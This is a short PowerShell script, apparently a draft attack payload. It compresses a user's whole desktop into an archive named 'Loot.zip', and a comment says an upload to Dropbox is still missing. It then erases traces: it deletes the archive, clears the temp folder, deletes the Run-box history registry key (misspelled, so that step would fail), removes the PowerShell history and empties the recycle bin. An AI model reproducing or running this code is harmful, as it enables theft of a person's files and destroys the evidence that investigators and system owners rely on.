#Grabs everything from the desktop and compresses it into a .zip file
#has to be changed from static to dynamic username!!!!!

$compress = @{
  Path = "C:\Users\patri\Desktop\"
  CompressionLevel = "Fastest"
  DestinationPath = "C:\Users\patri\Desktop\Loot.zip"
}
Compress-Archive @compress

#Upload to Dropbox or other filesharing service [MISSING FOR NOW]



#delete all traces

#delte created archive
del Loot.zip

#temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

#run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVErsion\Explorer\RunRMU /va /f

#powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

#recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue